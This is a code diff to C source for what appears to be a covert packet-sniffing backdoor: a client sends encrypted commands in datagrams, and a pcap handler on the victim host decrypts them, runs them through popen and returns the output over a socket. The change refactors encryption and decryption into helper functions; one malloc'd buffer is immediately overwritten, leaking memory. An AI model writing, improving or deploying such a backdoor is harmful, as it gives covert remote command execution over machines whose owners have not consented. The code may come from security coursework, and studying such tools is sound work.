@@ -117,6 +117,9 @@ void client(struct client_opt c_opt){
     
     /* Encrypt command */
     
+    char *bd_message = malloc(BD_MAX_MSG_LEN);
+    bd_message = encrypt(c_opt.command);
+    
     /* Set packet options and send packet */
     
     struct addr_info user_addr;
@@ -133,7 +136,7 @@ void client(struct client_opt c_opt){
         system_fatal("setsockopt");
     
     // Send packet
-    send_datagram(&user_addr, c_opt.command);
+    send_datagram(&user_addr, bd_message);
     
     /* Receive reply and print */
     
@@ -166,6 +169,9 @@ void client(struct client_opt c_opt){
     printf("Reply: \n");
     printf("%s\n", reply);
     
+    /* Cleanup */
+    
+    free(bd_message);
     close(sockfd);
 }
 
@@ -371,43 +377,12 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     
     /* Decrypt remaining packet data */
     
-    // Copy message
-    u_char message[BD_MAX_MSG_LEN];
-    memset(message, 0, BD_MAX_MSG_LEN);
-    strcpy((char *)message, (char *)(packet_info.payload + BD_KEY_LEN));
-    printf("Message: %s\n", message);
-    
-    /* Verify decryption succeeds by checking for header and footer */
-    
-    u_char *bd_header = message;
-    u_char *bd_footer = message + strlen((char *)message) - BD_KEY_LEN;
-    
-    if(strncmp((char *)bd_header, BD_HEADER, BD_KEY_LEN) != 0 || \
-        strncmp((char *)bd_footer, BD_FOOTER, BD_KEY_LEN) != 0 ){
-        printf("Decryption failed, discard.\n");
-        return;
-    }
-    else
-        printf("Decryption success!\n");
-    
-    /* All checks successful, run the system command */
-    
-    // Parse command
-    u_char bd_command[BD_MAX_MSG_LEN];
-    memset(bd_command, 0, BD_MAX_MSG_LEN);
-    strncpy((char *)bd_command, \
-        (char *)(message + BD_KEY_LEN), \
-        strlen((char *)message) - (2 * BD_KEY_LEN));
-    if(strlen((char *)bd_command) == 0){
-        printf("Invalid command: %s\n", bd_command);
-        return;
-    }
-    else
-        printf("Command: %s\n", bd_command);
+    char *bd_command;
+    bd_command = decrypt((char *)packet_info.payload);
     
     // Execute command
     FILE *fp;
-    fp = popen((char *)bd_command, "r");
+    fp = popen(bd_command, "r");
     if(fp == NULL){
         printf("Command error!\n");
         return;
@@ -430,10 +405,12 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     
     char output[1024];
     memset(output, 0, 1024);
-    fread((void *)output, sizeof(char), 1024, 
+    fread((void *)output, sizeof(char), 1024, fp);
     
     sendto(sockfd, output, strlen(output), 0, (struct sockaddr *)&dst_host, sizeof(dst_host));
     
+    // Cleanup
+    free(bd_command);
     close(sockfd);
     pclose(fp);
 }
